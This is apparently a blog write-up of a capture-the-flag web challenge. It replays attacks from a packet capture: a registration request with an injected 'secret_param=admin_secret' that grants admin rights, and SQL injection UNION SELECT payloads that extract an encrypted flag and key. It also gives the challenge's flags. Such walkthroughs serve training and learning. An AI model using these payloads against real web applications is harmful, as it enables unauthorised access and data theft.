    US Cyber Games Season 4: Unravel

    tjboeckman1

    5 min read

    16 minutes ago

    3

    0

    0

    • Facebook
    • LinkedIn
    • Pinterest
    • X (Twitter)

    The Unravel Challenge in the US Cyber Games Season 4 was a lot of fun and quite the challenge. The players were presented with a pcap file that captured a successful exploitation of the server and were tasked with replicating the exploit, and grabbing both an encryption key and an encrypted flag from a server that changed every 2 mins. (see screenswhot below)

    This means the challengers had to move fast and be accurate.


    In the pcap, there were 4 TCP streams. The first, as seen below, shows the user registering an account using username=exploit password=c26ab7f72db3018d secret_param=admin_secret, as well as sthe successful registration of an admin account.…

    Content-Type: application/x-www-form-urlencoded

 

username=exploit&password=c26ab7f72db3018d&secret_param=admin_secret

HTTP/1.1 200 OK

Server: Werkzeug/3.0.3 Python/3.9.19

Date: Sun, 26 May 2024 15:06:56 GMT

Content-Type: text/html; charset=utf-8

Content-Length: 1207

Vary: Cookie

Connection: close

 

<!DOCTYPE html>

<html lang="en">

<head>

    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Register</title>

    <link rel="stylesheet" href="/static/css/style.css">

</head>

<body>

    <header>

        <nav>

            <ul>

                <li><a href="/">Index</a></li>

                <li><a href="/login">Login</a></li>

                <li><a href="/register">Register</a></li>

               

               

            </ul>

        </nav>

    </header>

    <main>

       

<section class="auth-form">

    <h2>Register</h2>

   

    <p class="message">Registration Successful for exploit as role: admin</p>

…

    To replicate this, we used BurpSuite proxy to capture the web traffic and adjust the request sent to the server to create our own admin account. First, we launch BurpSuite and set the proxy intercept to on, and navigate to the challenge website. We forward the traffic until we reach the registration page.

    Here, we send any string to the server in username and password, we can alter them later, so anything at all will work.

    We take this intercepted POST and alter it to match the exploit seen in the pcap.

    We then forward the request, and we are now an admin!


    Now, back to the pcap and the next TCP stream. This one is just a capture of logging in with the new credentials, so we follow suit and log in to the website.




    We are now logged in and can see the “Admin Dashboard”. Once again, we return to the pcap for further instructions.


    This time we are on TCP stream 2


    GET /admin/products?search=widget%27%20UNION%20SELECT%20NULL,xor_encrypted_flag,NULL,NULL%20FROM%20xord_flag—

HTTP/1.1

Host: localhost:5000

User-Agent: python-requests/2.32.2

Accept-Encoding: gzip, deflate

Accept: /...

    This tells us to search for a specific item, so we simply send a get request, copy/paste the url/search string in place at the top of the request, and we can get the encrypted flag. We only have 2 minutes to obtain the flag, decrypt it, and post it to the server API to obtain the final flag.

    We can obtain this flag right now, but we still need the encryption key, so we put this on hold for a bit and move to the next TCP stream and obtain the encryption key first, as this does not change every 2 minutes.

    The next stream shows:

    GET /admin/products?search=widget%27%20UNION%20SELECT%20NULL,key,NULL,NULL%20FROM%20xor_encryption_key--

    so, we alter our request to match, send this request and obtain the key!



    Now that we have the encryption key, we need to set ourselves up to execute the final steps in rapid succession. Now, there are several ways we could proceed to capturing the final flag, but I opted to grab the encrypted flag, manually decode it, and pass it to a python script to make the API call and receive the response. First, to decode the flag we need to XOR it with the key, and while python is capable of obtaining the encrypted flag, XORing it with the key and send the API call, I chose to keep it simple. Thanks to our friends at decode.fr, we can go to their XOR-cipher page, (decode.fr/xor-cipher) input our key, paste the flag, and find our unravel flag. This is quite simple, so we move on to creating our python script to send the API call. The scenario page lays out all we need to know:

    There is a single API endpoint which will receive the flag. The /api/submit_flag endpoint allows users to submit a unravel{}decrypted flag for validation. If the submitted flag matches the current decrypted unravel{} flag, the user will receive a success message along with the SIVUSCG{} flag for points within CTFd. If the submitted flag is incorrect, an error message will be returned. Do not attempt to attack this API, it will be useless!
    Endpoint: /api/submit_flag

Method: POST

Content-Type: application/json

Request Body:

The request body should be a JSON object with the following field:

 

decrypted_flag (string, required): The current decrypted unravel{} flag within the database.

Example Request

 

POST /api/submit_flag

Content-Type: application/json

 

{

"decrypted_flag": "unravel{example_flag}"

}

    So we fire up our favorite python IDE and get to work!

    import requests
import json

# URL of the API endpoint
url = ' https://uscybercombine-s4-unravel.chals.io/api/submit_flag'

# Example decrypted flag to submit
decrypted_flag = "unravel{flag_56cab9e252e1f99d}"

# JSON payload
payload = {
    "decrypted_flag": decrypted_flag
}

# Headers specifying content type
headers = {
    'Content-Type': 'application/json'
}

# Sending POST request
try:
    response = requests.post(url, headers=headers, json=payload)

    # Print response
    print("Response status code:", response.status_code)
    print("Response body:", response.json())  # Assuming response is JSON

except requests.exceptions.RequestException as e:
    print("Error submitting flag:", e)

    With our script complete, we can move on to capturing the unravel flag. Now, due to the nature of the 2 minute rotation, in order to take full advantage of the 2 minutes, we craft the request for the encrypted flag, just like before, but then we take one more step to make our lives much easier… We right click the body of the request, and choose send to repeater.

    Now that we are in the repeater, all we have to do is hit send every so often until we witness the encrypted flag change, thus marking the 2 minute window counting down.


    In order to make sure we have everything correct the first time around, I copy/pasted the flag to the xor decoder and looked at the results. The first few times I got gibberish, then I realized the decryption key was in ASCII rather than hex format, after the change, the flag looks correct

    So we have the correct settings, now we just need to make the API call and snag the final flag!just in case we completed the task before the timer ran out, I plugged the flag into the script and the result was not surprising:

     Response status code: 400

Response body: {'message': 'Incorrect flag. Try again.'}

 

Process finished with exit code 0

    So, now we go back to the repeater and get a new code, but this time we wait until the reset, just to be absolutely sure we have enough time.this time we get :

    Response status code: 200

Response body: {'message': 'Congratulations! The flag is: SIVUSCG{r3vers3_att@cks_c@sh_ch3cks}'}

 

Process finished with exit code 0

    This means we have but 1 simple task left, to submit the flag to the CTF Platform and claim our prize!
